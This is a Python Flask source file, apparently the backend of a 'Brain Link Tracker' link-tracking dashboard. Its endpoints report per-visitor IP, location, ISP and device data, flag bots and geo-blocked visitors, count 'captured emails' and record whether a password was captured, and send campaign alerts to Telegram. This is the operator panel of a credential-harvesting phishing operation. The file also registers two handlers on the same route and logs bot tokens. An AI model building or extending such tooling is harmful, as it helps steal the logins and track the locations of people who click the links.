from flask import Blueprint, request, jsonify, session
from src.models.user import User, db
from src.services.telegram import TelegramService, TelegramNotifier
import json
import logging

logger = logging.getLogger(__name__)

settings_bp = Blueprint('settings', __name__)

def require_auth():
    """Check if user is authenticated via session"""
    if 'user_id' not in session:
        return None
    user = User.query.get(session['user_id'])
    return user

@settings_bp.route('/api/settings', methods=['GET'])
def get_settings():
    """Get user settings"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        user = User.query.get(session['user_id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Default settings
        default_settings = {
            'telegram_enabled': False,
            'telegram_bot_token': '',
            'telegram_chat_id': '',
            'telegram_frequency': '1hr',
            'theme': 'dark',
            'notifications': {
                'new_click': True,
                'email_captured': True,
                'bot_detected': True,
                'geo_blocked': True,
                'campaign_summary': True,
                'tracking_links': True,
                'captured_leads': True,
                'security_alerts': True,
                'live_activity': True
            }
        }
        
        # Get user settings from database (if stored)
        user_settings = default_settings
        if hasattr(user, 'settings') and user.settings:
            try:
                stored_settings = json.loads(user.settings)
                user_settings.update(stored_settings)
            except:
                pass
        
        return jsonify({
            'success': True,
            'settings': user_settings
        })
        
    except Exception as e:
        logger.error(f"Error getting settings: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@settings_bp.route('/api/settings', methods=['POST'])
def save_settings():
    """Save user settings"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        user = User.query.get(session['user_id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        settings_data = request.get_json()
        if not settings_data:
            return jsonify({'success': False, 'error': 'No settings data provided'}), 400
        
        # Save settings to user record
        user.settings = json.dumps(settings_data)
        db.session.commit()
        logger.info(f"Settings saved for user {user.id}: {settings_data}")
        
        return jsonify({
            'success': True,
            'message': 'Settings saved successfully'
        })
        
    except Exception as e:
        logger.error(f"Error saving settings: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@settings_bp.route('/api/settings/test-telegram', methods=['POST'])
def test_telegram():
    """Test Telegram bot connection"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        bot_token = data.get('bot_token')
        chat_id = data.get('chat_id')
        
        if not bot_token or not chat_id:
            return jsonify({'success': False, 'error': 'Bot token and chat ID are required'}), 400
        
        # Test the connection
        telegram = TelegramService(bot_token, chat_id)
        result = telegram.test_connection()
        
        # If successful, also send a sample notification
        if result.get('success'):
            notifier = TelegramNotifier(db.session)
            sample_data = {
                'name': 'Brain Link Tracker Test',
                'total_clicks': 1,
                'click_growth': 100,
                'unique_visitors': 1,
                'captured_emails': 0,
                'top_country': 'Test Location',
                'country_flag': '🧪',
                'best_link': 'Test Link',
                'opened': 1,
                'redirected': 0,
                'on_page': 0
            }
            notifier.send_notification(bot_token, chat_id, 'campaign_summary', sample_data)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error testing Telegram: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@settings_bp.route('/api/analytics/dashboard', methods=['GET'])
def get_dashboard_analytics():
    """Get dashboard analytics data from database"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        from src.models.link import Link
        from src.models.tracking_event import TrackingEvent
        from sqlalchemy import func, desc
        from datetime import datetime, timedelta
        
        time_range = request.args.get('range', '7d')
        
        # Calculate date range
        if time_range == '7d':
            start_date = datetime.utcnow() - timedelta(days=7)
        elif time_range == '30d':
            start_date = datetime.utcnow() - timedelta(days=30)
        elif time_range == '90d':
            start_date = datetime.utcnow() - timedelta(days=90)
        else:
            start_date = datetime.utcnow() - timedelta(days=7)
        
        # Get user's links
        user_links = Link.query.filter_by(user_id=session['user_id']).all()
        link_ids = [link.id for link in user_links]
        
        # Calculate statistics
        total_links = len(user_links)
        
        # Total clicks (all tracking events)
        total_clicks = TrackingEvent.query.filter(
            TrackingEvent.link_id.in_(link_ids),
            TrackingEvent.timestamp >= start_date
        ).count() if link_ids else 0
        
        # Real visitors (unique IP addresses)
        real_visitors = db.session.query(func.count(func.distinct(TrackingEvent.ip_address))).filter(
            TrackingEvent.link_id.in_(link_ids),
            TrackingEvent.timestamp >= start_date,
            TrackingEvent.is_bot == False
        ).scalar() if link_ids else 0
        
        # Captured emails
        captured_emails = TrackingEvent.query.filter(
            TrackingEvent.link_id.in_(link_ids),
            TrackingEvent.timestamp >= start_date,
            TrackingEvent.captured_email.isnot(None)
        ).count() if link_ids else 0
        
        # Chart data - clicks per day
        chart_data = []
        for i in range(7):
            date = datetime.utcnow() - timedelta(days=6-i)
            day_start = date.replace(hour=0, minute=0, second=0, microsecond=0)
            day_end = day_start + timedelta(days=1)
            
            clicks = TrackingEvent.query.filter(
                TrackingEvent.link_id.in_(link_ids),
                TrackingEvent.timestamp >= day_start,
                TrackingEvent.timestamp < day_end
            ).count() if link_ids else 0
            
            visitors = db.session.query(func.count(func.distinct(TrackingEvent.ip_address))).filter(
                TrackingEvent.link_id.in_(link_ids),
                TrackingEvent.timestamp >= day_start,
                TrackingEvent.timestamp < day_end,
                TrackingEvent.is_bot == False
            ).scalar() if link_ids else 0
            
            chart_data.append({
                'date': date.strftime('%Y-%m-%d'),
                'clicks': clicks,
                'visitors': visitors
            })
        
        # Device data
        device_counts = db.session.query(
            TrackingEvent.device_type,
            func.count(TrackingEvent.id)
        ).filter(
            TrackingEvent.link_id.in_(link_ids),
            TrackingEvent.timestamp >= start_date,
            TrackingEvent.device_type.isnot(None)
        ).group_by(TrackingEvent.device_type).all() if link_ids else []
        
        total_device_events = sum([count for _, count in device_counts])
        device_data = []
        for device, count in device_counts:
            percentage = round((count / total_device_events) * 100) if total_device_events > 0 else 0
            device_data.append({
                'name': device or 'Unknown',
                'value': percentage
            })
        
        # Country data
        country_counts = db.session.query(
            TrackingEvent.country,
            func.count(TrackingEvent.id)
        ).filter(
            TrackingEvent.link_id.in_(link_ids),
            TrackingEvent.timestamp >= start_date,
            TrackingEvent.country.isnot(None)
        ).group_by(TrackingEvent.country).order_by(desc(func.count(TrackingEvent.id))).limit(5).all() if link_ids else []
        
        country_flags = {
            'United States': '🇺🇸',
            'United Kingdom': '🇬🇧',
            'Canada': '🇨🇦',
            'Australia': '🇦🇺',
            'Germany': '🇩🇪',
            'France': '🇫🇷',
            'Japan': '🇯🇵',
            'Brazil': '🇧🇷',
            'India': '🇮🇳',
            'China': '🇨🇳'
        }
        
        country_data = []
        for country, count in country_counts:
            country_data.append({
                'name': country or 'Unknown',
                'value': count,
                'flag': country_flags.get(country, '🌍')
            })
        
        stats = {
            'totalLinks': total_links,
            'totalClicks': total_clicks,
            'realVisitors': real_visitors,
            'capturedEmails': captured_emails
        }
        
        return jsonify({
            'success': True,
            'stats': stats,
            'chartData': chart_data,
            'deviceData': device_data,
            'countryData': country_data
        })
        
    except Exception as e:
        logger.error(f"Error getting dashboard analytics: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@settings_bp.route('/api/tracking/events', methods=['GET'])
def get_tracking_events():
    """Get tracking events for live activity from database"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        from src.models.link import Link
        from src.models.tracking_event import TrackingEvent
        from sqlalchemy import desc
        
        # Get user's links
        user_links = Link.query.filter_by(user_id=session['user_id']).all()
        link_ids = [link.id for link in user_links]
        
        # Get recent tracking events
        events_query = TrackingEvent.query.filter(
            TrackingEvent.link_id.in_(link_ids)
        ).order_by(desc(TrackingEvent.timestamp)).limit(50) if link_ids else []
        
        events = []
        for event in events_query:
            # Format device type
            device_type = 'Unknown'
            if event.device_type:
                device_type = event.device_type.title()
            elif event.user_agent:
                ua = event.user_agent.lower()
                if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
                    device_type = 'Mobile'
                elif 'tablet' in ua or 'ipad' in ua:
                    device_type = 'Tablet'
                else:
                    device_type = 'Desktop'
            
            # Format browser
            browser = 'Unknown'
            if event.browser:
                browser = event.browser
            elif event.user_agent:
                ua = event.user_agent.lower()
                if 'chrome' in ua:
                    browser = 'Chrome'
                elif 'firefox' in ua:
                    browser = 'Firefox'
                elif 'safari' in ua:
                    browser = 'Safari'
                elif 'edge' in ua:
                    browser = 'Edge'
            
            # Format status
            status = 'Active'
            if event.status == 'opened':
                status = 'Opened'
            elif event.status == 'redirected':
                status = 'Redirected'
            elif event.status == 'on_page':
                status = 'On Page'
            elif event.blocked_reason:
                status = 'Blocked'
            
            # Format location
            location_parts = []
            if event.city:
                location_parts.append(event.city)
            if event.region:
                location_parts.append(event.region)
            if event.country:
                location_parts.append(event.country)
            location = ', '.join(location_parts) if location_parts else 'Unknown'
            
            # Format ISP info
            isp_info = event.isp or 'Unknown ISP'
            if event.organization and event.organization != event.isp:
                isp_info = f"{event.isp} ({event.organization})" if event.isp else event.organization
            
            events.append({
                'id': event.id,
                'timestamp': event.timestamp.strftime('%m/%d/%Y, %I:%M:%S %p') if event.timestamp else 'Unknown',
                'unique_id': event.unique_id or f"ID{event.id}",
                'ip_address': event.ip_address or 'Unknown',
                'country': event.country or 'Unknown',
                'city': event.city or 'Unknown',
                'region': event.region or 'Unknown',
                'zip_code': event.zip_code or 'Unknown',
                'location': location,
                'isp': isp_info,
                'organization': event.organization or 'Unknown',
                'as_number': event.as_number or 'Unknown',
                'user_agent': event.user_agent or 'Unknown',
                'device_type': device_type,
                'browser': browser,
                'browser_version': event.browser_version or 'Unknown',
                'os': event.os or 'Unknown',
                'os_version': event.os_version or 'Unknown',
                'status': status,
                'email_opened': event.email_opened,
                'redirected': event.redirected,
                'on_page': event.on_page,
                'captured_email': event.captured_email,
                'captured_password': bool(event.captured_password),
                'blocked_reason': event.blocked_reason,
                'is_bot': event.is_bot,
                'referrer': event.referrer,
                'session_duration': event.session_duration,
                'page_views': event.page_views or 1
            })
        
        return jsonify({
            'success': True,
            'events': events
        })
        
    except Exception as e:
        logger.error(f"Error getting tracking events: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@settings_bp.route('/api/campaigns', methods=['GET'])
def get_campaigns():
    """Get user campaigns"""
    try:
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        from src.models.link import Link
        from src.models.tracking_event import TrackingEvent
        from sqlalchemy import func
        
        # Get user's links grouped by campaign
        user_links = Link.query.filter_by(user_id=session['user_id']).all()
        
        # Group links by campaign name
        campaigns_dict = {}
        for link in user_links:
            campaign_name = link.campaign_name or 'Default Campaign'
            if campaign_name not in campaigns_dict:
                campaigns_dict[campaign_name] = {
                    'id': len(campaigns_dict) + 1,
                    'name': campaign_name,
                    'links': [],
                    'total_clicks': 0,
                    'captured_emails': 0,
                    'status': 'active'
                }
            campaigns_dict[campaign_name]['links'].append(link)
        
        # Calculate statistics for each campaign
        campaigns = []
        for campaign_name, campaign_data in campaigns_dict.items():
            link_ids = [link.id for link in campaign_data['links']]
            
            # Count total clicks
            total_clicks = TrackingEvent.query.filter(
                TrackingEvent.link_id.in_(link_ids)
            ).count() if link_ids else 0
            
            # Count captured emails
            captured_emails = TrackingEvent.query.filter(
                TrackingEvent.link_id.in_(link_ids),
                TrackingEvent.captured_email.isnot(None)
            ).count() if link_ids else 0
            
            campaigns.append({
                'id': campaign_data['id'],
                'name': campaign_name,
                'links_count': len(campaign_data['links']),
                'total_clicks': total_clicks,
                'captured_emails': captured_emails,
                'status': campaign_data['status']
            })
        
        return jsonify({
            'success': True,
            'campaigns': campaigns
        })
        
    except Exception as e:
        logger.error(f"Error getting campaigns: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@settings_bp.route('/api/settings/test-telegram', methods=['POST'])
def test_telegram_connection():
    """Test Telegram connection"""
    try:
        user = require_auth()
        if not user:
            return jsonify({'success': False, 'error': 'Not authenticated'}), 401
        
        data = request.get_json()
        bot_token = data.get('botToken')  # Frontend sends camelCase
        chat_id = data.get('chatId')      # Frontend sends camelCase
        
        if not bot_token or not chat_id:
            return jsonify({'error': 'Bot token and chat ID are required'}), 400
        
        # Test message
        message = "🔗 Brain Link Tracker Test\n\nTelegram notifications are working correctly!"
        
        # Send test message
        import requests
        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(telegram_url, json=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                'success': True,
                'message': 'Test message sent successfully!'
            })
        else:
            error_data = response.json()
            return jsonify({
                'error': f"Telegram API error: {error_data.get('description', 'Unknown error')}"
            }), 400
            
    except requests.exceptions.Timeout:
        return jsonify({'error': 'Request timeout - please check your bot token'}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({'error': f'Network error: {str(e)}'}), 400
    except Exception as e:
        logger.error(f"Error testing Telegram: {e}")
        return jsonify({'error': f'Unexpected error: {str(e)}'}), 500

